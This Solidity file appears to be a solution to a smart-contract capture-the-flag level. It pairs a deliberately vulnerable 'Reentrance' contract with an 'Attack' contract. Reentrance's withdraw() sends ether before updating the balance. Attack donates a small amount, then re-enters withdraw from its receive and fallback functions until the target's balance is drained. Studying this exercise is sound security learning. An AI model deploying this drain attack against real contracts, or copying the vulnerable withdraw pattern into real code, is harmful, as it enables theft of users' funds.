// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/solc-0.6/contracts/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}

// while callig this contact enter 1000000000000000 value 
contract Attack {
    Reentrance reentrance;
    
    constructor(Reentrance _reentrance) public {
        reentrance = _reentrance;
    }

    function attack() public payable{
        
        reentrance.donate{value:0.001 ether}(address(this));
        reentrance.withdraw(0.001 ether);
    }

    receive() external payable { 
        if(address(reentrance).balance > 0) {
            reentrance.withdraw(0.001 ether);
        }
    }

    fallback() external payable {
        if(address(reentrance).balance > 0) {
            reentrance.withdraw(0.001 ether);
        }
     }
}